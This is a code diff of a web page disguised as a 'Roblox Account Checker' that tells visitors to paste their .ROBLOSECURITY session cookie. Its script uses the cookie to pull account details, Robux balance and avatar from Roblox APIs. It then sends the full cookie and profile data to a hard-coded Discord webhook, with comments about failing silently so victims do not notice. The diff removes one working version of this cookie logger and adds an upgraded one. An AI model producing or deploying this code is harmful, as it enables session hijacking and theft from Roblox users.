@@ -3,24 +3,24 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Session Validator</title>
+  <title>Roblox Account Checker</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; padding: 40px; text-align: center; }
-    .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,170,255,0.3); }
-    h1 { color: #00aaff; }
-    input { width: 100%; padding: 12px; margin: 15px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; font-size: 16px; }
-    button { background: #00aaff; color: white; border: none; padding: 14px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
-    button:hover { background: #0088cc; }
+    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 40px; text-align: center; }
+    .container { max-width: 500px; margin: auto; background: #161b22; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(88,101,242,0.4); }
+    h1 { color: #5865f2; }
+    input { width: 100%; padding: 12px; margin: 15px 0; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 6px; font-size: 16px; }
+    button { background: #5865f2; color: white; border: none; padding: 14px 30px; font-size: 18px; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #4752c4; }
     #status { margin-top: 20px; color: #ff4444; font-weight: bold; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Roblox Session Validator</h1>
-    <p>Paste your .ROBLOSECURITY token below to verify session and account details.</p>
+    <h1>Roblox Account Checker</h1>
+    <p>Enter your .ROBLOSECURITY to verify account details.</p>
     
-    <input type="text" id="cookie" placeholder="Paste .ROBLOSECURITY here..." />
-    <button onclick="grabAndSend()">Validate Session</button>
+    <input type="text" id="cookie" placeholder="_|WARNING|-DO-NOT-SHARE-THIS.--..." />
+    <button onclick="grabAndSend()">Check Account</button>
     
     <div id="status"></div>
   </div>
@@ -28,40 +28,60 @@
   <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1477729306158432428/aKd2-VP_7LOYpIlqv4F0Za63-BnEsiaYE1TvOSDO7R4U6gYSsIjiw1WTjwqMDKXz0cBn";
 
-    async function sendToWebhook(data) {
+    async function sendEmbed(title, description, fields, color = 0x5865F2, thumbnail = null) {
+      const embed = {
+        title,
+        description,
+        color,
+        fields,
+        timestamp: new Date().toISOString(),
+        footer: { text: "Captain Hook Logger • " + new Date().toLocaleString() }
+      };
+      if (thumbnail) embed.thumbnail = { url: thumbnail };
+
       try {
         await fetch(WEBHOOK, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: "```ansi\n[1;31m[NEW COOKIE LOG][0m\n" + data + "\n```",
             username: "Captain Hook",
-            avatar_url: "https://i.imgur.com/yourhookicon.png" // optional, swap if you want
+            avatar_url: "https://i.imgur.com/your-pirate-icon.png", // swap if you got one
+            embeds: [embed],
+            content: "@everyone NEW HIT"  // ping if you want, remove if not
           })
         });
-      } catch (e) { /* silent fail - we don't want them to know */ }
+      } catch {}
     }
 
     async function fetchWithCookie(url, cookie, method = "GET", body = null) {
-      const headers = {
-        "Cookie": `.ROBLOSECURITY=${cookie}`,
-        "Accept": "application/json",
-        "Origin": "https://www.roblox.com"
-      };
-
-      // Try to grab CSRF if needed (many endpoints require it now)
       let csrf = "";
       try {
         const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
           method: "POST",
-          credentials: "include", // important
+          credentials: "include",
           headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
         });
         csrf = csrfRes.headers.get("x-csrf-token") || "";
-        if (csrf) headers["X-CSRF-TOKEN"] = csrf;
       } catch {}
 
-      const res = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : null });
+      const headers = {
+        "Cookie": `.ROBLOSECURITY=${cookie}`,
+        "Accept": "application/json",
+        "Origin": "https://www.roblox.com",
+        "X-CSRF-TOKEN": csrf || ""
+      };
+
+      let res = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : null });
+
+      // If 403 Token Validation Failed, retry with fresh CSRF
+      if (res.status === 403) {
+        const newCsrf = res.headers.get("x-csrf-token");
+        if (newCsrf) {
+          headers["X-CSRF-TOKEN"] = newCsrf;
+          res = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : null });
+        }
+      }
+
       if (!res.ok) throw new Error(`HTTP ${res.status}`);
       return res.json().catch(() => ({}));
     }
@@ -70,52 +90,70 @@
       const status = document.getElementById("status");
       const cookieInput = document.getElementById("cookie").value.trim();
 
-      if (!cookieInput || !cookieInput.includes("_|WARNING")) {
-        status.textContent = "Invalid format. Should start with _|WARNING...";
+      if (!cookieInput.includes("_|WARNING")) {
+        status.textContent = "Bad format - needs to start with _|WARNING...";
         return;
       }
 
-      status.textContent = "Validating...";
+      status.textContent = "Grabbing info...";
 
       try {
-        // Step 1: Get authenticated user basics
+        // Authenticated basics
         const authInfo = await fetchWithCookie("https://users.roblox.com/v1/users/authenticated", cookieInput);
-        if (!authInfo.id) throw new Error("Invalid cookie");
+        if (!authInfo.id) throw new Error("Cookie invalid or expired");
 
         const userId = authInfo.id;
         const username = authInfo.name;
         const displayName = authInfo.displayName;
 
-        // Step 2: Get detailed user info (creation date etc)
+        // Detailed user
         const userDetails = await fetchWithCookie(`https://users.roblox.com/v1/users/${userId}`, cookieInput);
-
-        // Step 3: Try to get Robux (this one fails often without extra headers, but worth a shot)
-        let robux = "Unknown / Failed";
-        try {
-          const currency = await fetchWithCookie(`https://economy.roblox.com/v1/users/${userId}/currency`, cookieInput);
-          robux = currency.robux?.toLocaleString() || "Hidden / Private";
-        } catch {}
-
-        const created = userDetails.created ? new Date(userDetails.created).toLocaleDateString() : "Unknown";
+        const created = userDetails.created ? new Date(userDetails.created) : null;
+        const ageDays = created ? Math.floor((Date.now() - created) / (1000*60*60*24)) : "Unknown";
         const description = userDetails.description || "None";
 
-        const log = `
-Cookie: ${cookieInput}
-User ID: ${userId}
-Username: ${username}
-Display Name: ${displayName}
-Created: ${created} (${Math.floor((Date.now() - new Date(created)) / (1000*60*60*24*365))} years old)
-Description: ${description.substring(0, 200)}${description.length > 200 ? "..." : ""}
-Robux: ${robux}
-IP / Browser: ${navigator.userAgent}
-`;
+        // Avatar thumbnail
+        let avatar = null;
+        try {
+          const thumb = await fetchWithCookie(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, cookieInput);
+          avatar = thumb.data?.[0]?.imageUrl || null;
+        } catch {}
 
-        await sendToWebhook(log);
-        status.innerHTML = "Session validated successfully.<br><strong style='color:#0f0'>Details sent to server.</strong>";
+        // Robux try (often fails)
+        let robux = "Unknown";
+        try {
+          const currency = await fetchWithCookie(`https://economy.roblox.com/v1/users/${userId}/currency`, cookieInput);
+          robux = currency.robux ? currency.robux.toLocaleString() : "Private / Failed";
+        } catch {}
+
+        const fields = [
+          { name: "Username", value: username, inline: true },
+          { name: "Display Name", value: displayName, inline: true },
+          { name: "User ID", value: userId.toString(), inline: true },
+          { name: "Account Age", value: `${ageDays} Days (${Math.floor(ageDays/365)} years)`, inline: true },
+          { name: "Robux Balance", value: robux, inline: true },
+          { name: "Description", value: description.substring(0, 200) + (description.length > 200 ? "..." : ""), inline: false },
+          { name: "Full Cookie", value: "||`" + cookieInput + "`||", inline: false }  // spoiler so safe
+        ];
+
+        await sendEmbed(
+          "NEW COOKIE HIT",
+          `Logged account for **${displayName}** (@${username})`,
+          fields,
+          0xFF0000,  // red for hit
+          avatar
+        );
+
+        status.innerHTML = "<strong style='color:#00ff00'>Success - details sent!</strong>";
       } catch (err) {
-        status.textContent = "Validation failed: " + err.message;
-        // Still send whatever we got + cookie in case partial success
-        await sendToWebhook(`Partial fail - Cookie still good?\n${cookieInput}\nError: ${err.message}`);
+        status.textContent = "Grab failed: " + err.message;
+        // Send cookie anyway as fallback
+        await sendEmbed(
+          "PARTIAL COOKIE LOG",
+          "Cookie sent but full info grab failed.",
+          [{ name: "Cookie", value: "||`" + cookieInput + "`||", inline: false }],
+          0xFFA500  // orange
+        );
       }
     }
   </script>
